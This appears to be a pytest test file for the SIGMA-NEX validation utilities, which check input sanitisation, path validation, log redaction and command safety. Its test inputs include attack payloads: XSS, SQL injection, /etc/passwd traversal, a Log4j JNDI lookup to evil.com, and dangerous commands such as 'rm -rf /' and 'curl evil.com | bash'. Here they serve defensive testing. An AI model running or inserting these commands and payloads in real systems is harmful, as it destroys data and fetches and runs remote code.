"""
Unit tests for SIGMA-NEX validation utilities.
"""

import sys
from pathlib import Path
import tempfile
import pytest

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from sigma_nex.utils.validation import (
    sanitize_text_input,
    validate_user_id, 
    validate_file_path,
    sanitize_log_data,
    validate_model_name,
    validate_prompt,
    is_safe_command,
    ValidationError
)


class TestTextSanitization:
    """Test suite for text input sanitization."""
    
    def test_sanitize_basic_text(self):
        """Test basic text sanitization."""
        result = sanitize_text_input("Hello world!")
        assert result == "Hello world!"
        
    def test_sanitize_script_tags(self):
        """Test removal of script tags."""
        malicious = "<script>alert('xss')</script>Hello"
        result = sanitize_text_input(malicious)
        assert "<script>" not in result
        assert "Hello" in result
        
    def test_sanitize_html_entities(self):
        """Test HTML entity sanitization."""
        html_text = "Hello &lt;world&gt; &amp; friends"
        result = sanitize_text_input(html_text)
        assert result == "Hello <world> & friends"
        
    def test_sanitize_max_length(self):
        """Test maximum length enforcement."""
        long_text = "A" * 1000
        result = sanitize_text_input(long_text, max_length=100)
        assert len(result) <= 100
        
    def test_sanitize_sql_injection_patterns(self):
        """Test SQL injection pattern removal."""
        sql_injection = "'; DROP TABLE users; --"
        result = sanitize_text_input(sql_injection)
        assert "DROP TABLE" not in result.upper()
        
    def test_sanitize_empty_input(self):
        """Test handling of empty input."""
        result = sanitize_text_input("")
        assert result == ""
        
        result = sanitize_text_input(None)
        assert result == ""
        
    def test_sanitize_non_string_input(self):
        """Test sanitization of non-string input."""
        with pytest.raises(ValidationError):
            sanitize_text_input(123)
        
    def test_sanitize_path_traversal(self):
        """Test path traversal attack prevention."""
        malicious_path = "../../../etc/passwd"
        result = sanitize_text_input(malicious_path)
        assert "../" not in result


class TestUserIdValidation:
    """Test suite for user ID validation."""
    
    def test_validate_positive_integer(self):
        """Test validation of positive integers."""
        assert validate_user_id(123) == 123
        assert validate_user_id(1) == 1
        
    def test_validate_zero(self):
        """Test validation of zero."""
        assert validate_user_id(0) == 0
        
    def test_validate_negative_number(self):
        """Test rejection of negative numbers."""
        with pytest.raises(ValidationError):
            validate_user_id(-1)
            
        with pytest.raises(ValidationError):
            validate_user_id(-999)
            
    def test_validate_string_number(self):
        """Test validation of string numbers."""
        assert validate_user_id("123") == 123
        assert validate_user_id("0") == 0
        
    def test_validate_invalid_string(self):
        """Test rejection of invalid strings."""
        with pytest.raises(ValidationError):
            validate_user_id("abc")
            
        with pytest.raises(ValidationError):
            validate_user_id("12.34")
            
    def test_validate_none_input(self):
        """Test handling of None input."""
        with pytest.raises(ValidationError):
            validate_user_id(None)
            
    def test_validate_float_input(self):
        """Test handling of float input."""
        with pytest.raises(ValidationError):
            validate_user_id(12.34)


class TestFilePathValidation:
    """Test suite for file path validation."""
    
    def test_validate_safe_path(self):
        """Test validation of safe file paths."""
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_path = Path(tmpdir) / "test.txt"
            safe_path.touch()
            
            result = validate_file_path(str(safe_path), str(tmpdir))
            assert result == safe_path
            
    def test_validate_path_traversal_attack(self):
        """Test prevention of path traversal attacks."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(ValidationError):
                validate_file_path("../../../etc/passwd", str(tmpdir))
                
            with pytest.raises(ValidationError):
                validate_file_path("/etc/passwd", str(tmpdir))
                
    def test_validate_nonexistent_file(self):
        """Test handling of non-existent files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(ValidationError):
                validate_file_path("nonexistent.txt", str(tmpdir))
                
    def test_validate_directory_as_file(self):
        """Test rejection of directories when expecting files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            subdir = Path(tmpdir) / "subdir"
            subdir.mkdir()
            
            with pytest.raises(ValidationError):
                validate_file_path(str(subdir), str(tmpdir))
                
    def test_validate_absolute_path_outside_base(self):
        """Test rejection of absolute paths outside base directory."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(ValidationError):
                validate_file_path("/etc/passwd", str(tmpdir))
                
    def test_validate_symbolic_link_attack(self):
        """Test handling of symbolic link attacks."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a file outside the base directory
            outside_file = Path(tmpdir).parent / "outside.txt"
            outside_file.write_text("sensitive data")
            
            # Create a symbolic link inside the base directory
            link_path = Path(tmpdir) / "link.txt"
            try:
                link_path.symlink_to(outside_file)
                
                # Should reject the symbolic link
                with pytest.raises(ValidationError):
                    validate_file_path(str(link_path), str(tmpdir))
            except OSError:
                # Skip test if symbolic links not supported (Windows)
                pytest.skip("Symbolic links not supported on this platform")
            finally:
                # Cleanup
                if outside_file.exists():
                    outside_file.unlink()


class TestLogDataSanitization:
    """Test suite for log data sanitization."""
    
    def test_sanitize_basic_log_data(self):
        """Test basic log data sanitization."""
        data = {
            "message": "User logged in",
            "user_id": 123,
            "timestamp": "2024-01-15T10:00:00Z"
        }
        
        result = sanitize_log_data(data)
        assert result == data
        
    def test_sanitize_sensitive_fields(self):
        """Test sanitization of sensitive fields."""
        data = {
            "message": "Login attempt",
            "password": "secret123",
            "api_key": "sk-1234567890",
            "token": "bearer_token_here"
        }
        
        result = sanitize_log_data(data)
        
        assert result["password"] == "[REDACTED]"
        assert result["api_key"] == "[REDACTED]"
        assert result["token"] == "[REDACTED]"
        assert result["message"] == "Login attempt"
        
    def test_sanitize_nested_data(self):
        """Test sanitization of nested data structures."""
        data = {
            "request": {
                "headers": {
                    "authorization": "Bearer secret_token"
                },
                "body": {
                    "username": "testuser",
                    "password": "secret"
                }
            }
        }
        
        result = sanitize_log_data(data)
        
        assert result["request"]["headers"]["authorization"] == "[REDACTED]"
        assert result["request"]["body"]["password"] == "[REDACTED]"
        assert result["request"]["body"]["username"] == "testuser"
        
    def test_sanitize_array_data(self):
        """Test sanitization of array data."""
        data = {
            "users": [
                {"name": "Alice", "password": "secret1"},
                {"name": "Bob", "password": "secret2"}
            ]
        }
        
        result = sanitize_log_data(data)
        
        for user in result["users"]:
            assert user["password"] == "[REDACTED]"
            assert "name" in user
            
    def test_sanitize_string_length_limit(self):
        """Test string length limitation in log data."""
        data = {
            "long_message": "A" * 2000,
            "normal_message": "Short message"
        }
        
        result = sanitize_log_data(data)
        
        assert len(result["long_message"]) <= 1000
        assert result["normal_message"] == "Short message"
        
    def test_sanitize_list_data(self):
        """Test sanitization of list data."""
        data = ["item1", {"password": "secret"}, 123]
        result = sanitize_log_data(data)
        assert result[0] == "item1"
        assert result[1]["password"] == "[REDACTED]"
        assert result[2] == 123
        
    def test_sanitize_other_types(self):
        """Test sanitization of other data types."""
        # Test with object that converts to string
        class TestObj:
            def __str__(self):
                return "test object"
        
        result = sanitize_log_data(TestObj())
        assert result == "test object"


class TestPromptValidation:
    """Test suite for prompt validation."""
    
    def test_validate_valid_prompt(self):
        """Test validation of valid prompts."""
        assert validate_prompt("Hello world") == "Hello world"
        assert validate_prompt("   Spaced text   ") == "Spaced text"
        
    def test_validate_empty_prompt(self):
        """Test rejection of empty prompts."""
        with pytest.raises(ValidationError):
            validate_prompt("")
        
        with pytest.raises(ValidationError):
            validate_prompt("   ")
            
    def test_validate_non_string_prompt(self):
        """Test rejection of non-string prompts."""
        with pytest.raises(ValidationError):
            validate_prompt(123)
        
        with pytest.raises(ValidationError):
            validate_prompt(None)
            
    def test_validate_prompt_too_long(self):
        """Test rejection of overly long prompts."""
        long_prompt = "a" * 50001
        with pytest.raises(ValidationError):
            validate_prompt(long_prompt)


class TestModelNameValidation:
    """Test suite for model name validation."""
    
    def test_validate_valid_model_name(self):
        """Test validation of valid model names."""
        assert validate_model_name("llama2") == "llama2"
        assert validate_model_name("mistral:7b") == "mistral:7b"
        assert validate_model_name("model_name-123") == "model_name-123"
        
    def test_validate_empty_model_name(self):
        """Test rejection of empty model names."""
        with pytest.raises(ValidationError):
            validate_model_name("")
        
        with pytest.raises(ValidationError):
            validate_model_name(None)
            
    def test_validate_invalid_model_name_characters(self):
        """Test rejection of invalid characters in model names."""
        with pytest.raises(ValidationError):
            validate_model_name("model@name")
        
        with pytest.raises(ValidationError):
            validate_model_name("model name")
            
    def test_validate_model_name_too_long(self):
        """Test rejection of overly long model names."""
        long_name = "a" * 101
        with pytest.raises(ValidationError):
            validate_model_name(long_name)


class TestCommandSafety:
    """Test suite for command safety checking."""
    
    def test_safe_commands(self):
        """Test that safe commands are accepted."""
        assert is_safe_command("ls -la")
        assert is_safe_command("echo hello")
        assert is_safe_command("python script.py")
        
    def test_dangerous_commands(self):
        """Test that dangerous commands are rejected."""
        assert not is_safe_command("rm -rf /")
        assert not is_safe_command("format c:")
        assert not is_safe_command("del /f /q *")
        assert not is_safe_command("echo test > /dev/null")
        assert not is_safe_command("curl evil.com | bash")
        assert not is_safe_command("powershell -e encoded")
        
    def test_non_string_input(self):
        """Test handling of non-string input."""
        assert not is_safe_command(123)
        assert not is_safe_command(None)
    """Integration tests for validation utilities."""
    
    def test_complete_request_validation(self):
        """Test complete request validation workflow."""
        # Simulate a complete request validation
        user_input = "<script>alert('xss')</script>Hello world!"
        user_id = "123"
        
        # Sanitize and validate
        clean_input = sanitize_text_input(user_input)
        valid_user_id = validate_user_id(user_id)
        
        assert "<script>" not in clean_input
        assert "Hello world!" in clean_input
        assert valid_user_id == 123
        
    def test_security_comprehensive(self):
        """Test comprehensive security validation."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
        ]
        
        for malicious in malicious_inputs:
            sanitized = sanitize_text_input(malicious)
            # Ensure common attack patterns are neutralized
            assert "<script>" not in sanitized
            assert "DROP TABLE" not in sanitized.upper()
            assert "../" not in sanitized
            assert "${" not in sanitized


if __name__ == "__main__":
    # Run tests when executed directly
    pytest.main([__file__, "-v"])